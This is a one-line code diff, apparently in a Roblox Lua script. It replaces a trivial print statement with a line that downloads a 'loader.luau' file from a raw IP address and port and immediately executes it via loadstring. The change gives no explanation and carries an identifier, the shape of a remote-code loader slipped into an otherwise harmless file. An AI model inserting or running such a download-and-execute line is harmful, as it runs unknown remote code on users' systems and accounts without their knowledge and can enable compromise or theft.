@@ -1,1 +1,1 @@
-ptint("hello")
+ID="8dfac11c-90f4-42eb-9ef8-8721ebc47be4";loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
